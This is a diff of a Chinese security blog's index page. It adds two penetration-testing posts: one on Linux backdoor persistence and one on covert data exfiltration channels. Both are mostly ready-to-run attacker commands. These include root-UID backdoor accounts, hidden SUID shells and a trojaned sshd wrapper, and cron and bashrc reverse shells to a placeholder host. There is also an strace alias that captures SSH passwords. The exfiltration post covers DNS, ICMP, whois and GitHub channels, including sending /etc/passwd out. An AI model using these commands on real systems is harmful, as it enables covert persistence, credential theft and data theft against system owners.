@@ -475,6 +475,384 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/05/linux后门手法总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2021/01/05/linux后门手法总结/" itemprop="url">
+                  linux后门手法总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-05T20:00:28+08:00">
+                2021-01-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2021/01/05/linux后门手法总结/" class="leancloud_visitors" data-flag-title="linux后门手法总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd guest;echo &apos;guest:123456&apos;|chpasswd</span><br><span class="line">echo &quot;guest:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+<h2 id="ssh公钥登录"><a href="#ssh公钥登录" class="headerlink" title="ssh公钥登录"></a>ssh公钥登录</h2><p>将公钥放到服务器的.ssh/authorized_keys中，使用私钥登录</p>
+<h2 id="suid-shell"><a href="#suid-shell" class="headerlink" title="suid shell"></a>suid shell</h2><p>使用root账户执行如下命令，在某个用户目录下建立一个隐藏的suid文件.233，加点为了隐藏文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /home/test/.233</span><br><span class="line">chmod 4755 /home/test/.233</span><br></pre></td></tr></table></figure></p>
+<p>之后在每次使用时，以其他普通用户的身份使用-p选项运行此文件，即可获得一个root权限的shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/test/.233 -p</span><br></pre></td></tr></table></figure></p>
+<h2 id="ssh软连接"><a href="#ssh软连接" class="headerlink" title="ssh软连接"></a>ssh软连接</h2><p>创建ssh软连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;</span><br></pre></td></tr></table></figure></p>
+<p>攻击机连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@ip:5555</span><br></pre></td></tr></table></figure></p>
+<h2 id="inetd"><a href="#inetd" class="headerlink" title="inetd"></a>inetd</h2><p>可以通过修改/etc/inetd.conf文件维持权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/inetd.conf</span><br><span class="line">添加内容</span><br><span class="line">daytime stream tcp nowait root /bin/bash bash -i</span><br><span class="line">重启服务</span><br><span class="line">service inetd restart</span><br></pre></td></tr></table></figure></p>
+<p>攻击者使用nc连接shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv ip 13</span><br></pre></td></tr></table></figure>
+<h2 id="Crontab后门"><a href="#Crontab后门" class="headerlink" title="Crontab后门"></a>Crontab后门</h2><p>每天6点反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 6 * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<h2 id="修改-bash-profile-和-bashrc"><a href="#修改-bash-profile-和-bashrc" class="headerlink" title="修改~/.bash_profile 和~/.bashrc"></a>修改~/.bash_profile 和~/.bashrc</h2><p>此类文件在新shell打开时会自动执行，将后门程序写入这类文件可以在每次打开新shell的时候进行一个反弹shell操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在文件中添加bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>利用strace窃取ssh密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.bashrc或者/etc/bashrc</span><br><span class="line">alias ssh=&apos;strace -f -e trace=read,write -o /tmp/.ssh-`date&apos;+%d%h%m%s&apos;`.log -s 32 ssh&apos;</span><br><span class="line">source ~/.bashrc</span><br><span class="line">cat /tmp/.sshxxxxx | grep &quot;read(4,&quot;</span><br></pre></td></tr></table></figure></p>
+<h2 id="SSH-wrapper后门"><a href="#SSH-wrapper后门" class="headerlink" title="SSH wrapper后门"></a>SSH wrapper后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line">echo &apos;#!/usr/bin/perl&apos; &gt;sshd</span><br><span class="line">echo &apos;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd</span><br><span class="line">echo &apos;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br><span class="line">连接：</span><br><span class="line">socat STDIO TCP4:target_ip:22,sourceport=13377</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/04/数据回传通道总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2021/01/04/数据回传通道总结/" itemprop="url">
+                  数据回传通道总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-04T18:15:27+08:00">
+                2021-01-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2021/01/04/数据回传通道总结/" class="leancloud_visitors" data-flag-title="数据回传通道总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>攻陷目标主机之后并不意味着就不用再和防火墙斗智斗勇，数据回传的过程仍然有可能被防火墙发现和阻止，所以我们要根据实际情况选择更隐秘的方式传出文件。本文总结了常用的数据传出方式，将持续更新。</p>
+<h2 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h2><p>利用http.server回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python2：</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line">python3:</span><br><span class="line">python -m http.server</span><br><span class="line">php:</span><br><span class="line">php -S 0.0.0.0:8888</span><br></pre></td></tr></table></figure></p>
+<p>利用ftp回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service vsftpd start</span><br><span class="line">访问ip:21</span><br></pre></td></tr></table></figure></p>
+<p>利用smb回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/samba</span><br><span class="line">vi smb.conf</span><br><span class="line">文件内添加:</span><br><span class="line">[share]</span><br><span class="line">    path =/home/share</span><br><span class="line">    available = yes</span><br><span class="line">    browsealbe = yes</span><br><span class="line">    public= no</span><br><span class="line">    writable = yes</span><br><span class="line">cd /home</span><br><span class="line">mkdir share</span><br><span class="line">chmod -R 777 share</span><br><span class="line">useradd share</span><br><span class="line">smbpasswd -a share</span><br><span class="line">service smbd restart</span><br><span class="line">访问\\ip</span><br></pre></td></tr></table></figure></p>
+<p>利用scp回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp localfilename root@xx.xx.xx.xx:filename</span><br></pre></td></tr></table></figure></p>
+<h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p>1.命令行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(xxd -p -c 10 ssh_host_ecdsa_key);do sleep 1s &amp;&amp; nslookup $i.xxx.com xx.xx.xx.xx;done</span><br></pre></td></tr></table></figure></p>
+<p>2.dnscat2、dns2tcp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">攻击机（server）：</span><br><span class="line">安装</span><br><span class="line">apt-get install ruby ruby-dev git make g++ rubygems</span><br><span class="line">gem update --system</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br><span class="line">设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址，运行</span><br><span class="line">ruby ./dnscat2.rb dns.uuzdaisuki.com --no-cache</span><br><span class="line"></span><br><span class="line">受害者（linux）安装</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/client/</span><br><span class="line">make</span><br><span class="line">受害者（windows）安装</span><br><span class="line">https://downloads.skullsecurity.org/dnscat2/ 下载win32.zip的dnascat2后解压</span><br><span class="line"></span><br><span class="line">将server中产生的secret复制下来，运行</span><br><span class="line">./dnscat --dns domain=dns.uuzdaisuki.com --secret=xxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">session -i 1</span><br></pre></td></tr></table></figure>
+<p>详情参考：</p>
+<p><a href="http://next.uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/</a></p>
+<h2 id="ping隧道"><a href="#ping隧道" class="headerlink" title="ping隧道"></a>ping隧道</h2><p>1.命令行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat a.txt | xxd -p -c 1|xargs -n 1 -I &apos;&#123;&#125;&apos; ping -c 1 -s 56 -p &apos;&#123;&#125;&apos; xx.xx.xx.xx</span><br></pre></td></tr></table></figure></p>
+<p>2.pingtunnel</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://www.cs.uit.no/~daniels/PingTunnel/</span><br><span class="line">ptunnel -p 192.168.100.232 -lp 8888 -da 192.168.118.131 -dp 3389</span><br><span class="line">    -p 指定ICMP隧道另一端的IP</span><br><span class="line">    -lp：指定本地监听的端口</span><br><span class="line">    -da：指定要转发的目标机器的IP</span><br><span class="line">    -dp：指定要转发的目标机器的端口</span><br><span class="line">    -x：指定连接密码</span><br></pre></td></tr></table></figure>
+<p>3.icmpsh展开cc通道：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">攻击者机器部署icmpsh：</span><br><span class="line">git clone https://github.com/inquisb/icmpsh.git</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br><span class="line">cd icmpsh</span><br><span class="line">syntax: ./icmpsh_m.py &lt;attacker’s-IP&gt; &lt;target-IP&gt;</span><br><span class="line">./icmpsh_m.py 192.168.1.108 192.168.1.106</span><br><span class="line">受害者机器：</span><br><span class="line">syntax: icmpsh.exe -t &lt;Kali IP&gt;</span><br><span class="line">icmpsh.exe -t 192.168.1.108</span><br></pre></td></tr></table></figure></p>
+<p>4.icmptunnel<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">受害者主机：</span><br><span class="line">安装icmptunnel</span><br><span class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</span><br><span class="line">cd icmptunnel</span><br><span class="line">make</span><br><span class="line">禁用ICMP echo回复</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line">服务端模式启动icmptunnel，并且给新的隧道接口分配一个IP地址</span><br><span class="line">./icmptunnel -s</span><br><span class="line">Ctrlz</span><br><span class="line">bg</span><br><span class="line">/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0</span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line">攻击者主机：</span><br><span class="line">安装icmptunnel</span><br><span class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</span><br><span class="line">cd icmptunnel</span><br><span class="line">make</span><br><span class="line">禁用ICMP echo回复</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line">运行</span><br><span class="line">./icmptunnel 192.168.1.108</span><br><span class="line">ctrl z</span><br><span class="line">/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0</span><br></pre></td></tr></table></figure></p>
+<h2 id="http隧道"><a href="#http隧道" class="headerlink" title="http隧道"></a>http隧道</h2><p>1.reGeorg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sensepost/reGeorg.git</span><br><span class="line">pip install urllib3</span><br><span class="line">将对应页面上传到目标服务器上</span><br><span class="line">并在本地监听</span><br><span class="line">python reGeorgSocksProxy.py ‐p 8080 ‐l 192.168.1.5 ‐u </span><br><span class="line">访问目标</span><br><span class="line">http://192.168.1.119/tunnel.aspx</span><br></pre></td></tr></table></figure></p>
+<p>2.ABPTTS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">apt-get install python-dev  build-essential libssl-dev libffi-dev  libxml2-dev libxslt1-dev zlib1g-dev python-pip</span><br><span class="line"> pip install pycrypto</span><br><span class="line">git clone https://github.com/nccgroup/ABPTTS.git</span><br><span class="line">cd ABPTTS/</span><br><span class="line">生成payload</span><br><span class="line">python abpttsfactory.py ‐o webshell</span><br><span class="line">传到目标靶机</span><br><span class="line">端口转发</span><br><span class="line">python abpttsclient.py ‐c webshell/config.txt ‐u &quot;http://192.168.1.119/abptts.aspx&quot; ‐f 192.168.1.5:33389/192.168.1.119:3389</span><br><span class="line">让攻击机的33389端口流量转发到3389，通过HTTPS服务</span><br></pre></td></tr></table></figure></p>
+<h2 id="whois隧道"><a href="#whois隧道" class="headerlink" title="whois隧道"></a>whois隧道</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">失陷机：</span><br><span class="line">root@kali:~# whois -h x.x.x.x -p 4444 `cat /etc/passwd | base64`</span><br><span class="line">接受机：</span><br><span class="line">root@kali:/tmp# nc -l -v -p 4444 | sed &quot;&quot;s/ //g&quot;&quot; | base64 -d</span><br></pre></td></tr></table></figure>
+<h2 id="社交平台或工具"><a href="#社交平台或工具" class="headerlink" title="社交平台或工具"></a>社交平台或工具</h2><p>利用腾讯qq、微信等工具回传</p>
+<h2 id="代码托管"><a href="#代码托管" class="headerlink" title="代码托管"></a>代码托管</h2><p>利用github回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">通过一个匿名邮箱注册github账户，并创建一个空仓库</span><br><span class="line">mdkir upload</span><br><span class="line">cd upload</span><br><span class="line">git config --global user.name “user.name”</span><br><span class="line">git config --global user.email “user.email”</span><br><span class="line">git clone https://github.com/xxx/xxx.git</span><br><span class="line">cp -r file upload</span><br><span class="line">git add *</span><br><span class="line">git commit -m &quot;update&quot;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure></p>
+<h2 id="云储存"><a href="#云储存" class="headerlink" title="云储存"></a>云储存</h2><p>利用百度网盘等网盘类工具回传</p>
+<h2 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h2><p>利用邮件外发回传</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/24/redis未授权getshell的多种方式/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1227,384 +1605,6 @@
 <p>即可将客户端网络作为代理出口使用</p>
 <h3 id="客户端配置（web转发）"><a href="#客户端配置（web转发）" class="headerlink" title="客户端配置（web转发）"></a>客户端配置（web转发）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 7000</span><br><span class="line">token = www.baidu.com</span><br><span class="line">[web]</span><br><span class="line">type = http</span><br><span class="line">local_port = 8080</span><br><span class="line">custom_domains = www.yourdomain.com</span><br></pre></td></tr></table></figure>
 <h3 id="客户端配置（ssh转发）"><a href="#客户端配置（ssh转发）" class="headerlink" title="客户端配置（ssh转发）"></a>客户端配置（ssh转发）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 7000</span><br><span class="line">token = www.baidu.com</span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/17/数据回传通道总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/10/17/数据回传通道总结/" itemprop="url">
-                  数据回传通道总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-10-17T18:15:27+08:00">
-                2020-10-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/10/17/数据回传通道总结/" class="leancloud_visitors" data-flag-title="数据回传通道总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>攻陷目标主机之后并不意味着就不用再和防火墙斗智斗勇，数据回传的过程仍然有可能被防火墙发现和阻止，所以我们要根据实际情况选择更隐秘的方式传出文件。本文总结了常用的数据传出方式，将持续更新。</p>
-<h2 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h2><p>利用http.server回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python2：</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line">python3:</span><br><span class="line">python -m http.server</span><br><span class="line">php:</span><br><span class="line">php -S 0.0.0.0:8888</span><br></pre></td></tr></table></figure></p>
-<p>利用ftp回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service vsftpd start</span><br><span class="line">访问ip:21</span><br></pre></td></tr></table></figure></p>
-<p>利用smb回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/samba</span><br><span class="line">vi smb.conf</span><br><span class="line">文件内添加:</span><br><span class="line">[share]</span><br><span class="line">    path =/home/share</span><br><span class="line">    available = yes</span><br><span class="line">    browsealbe = yes</span><br><span class="line">    public= no</span><br><span class="line">    writable = yes</span><br><span class="line">cd /home</span><br><span class="line">mkdir share</span><br><span class="line">chmod -R 777 share</span><br><span class="line">useradd share</span><br><span 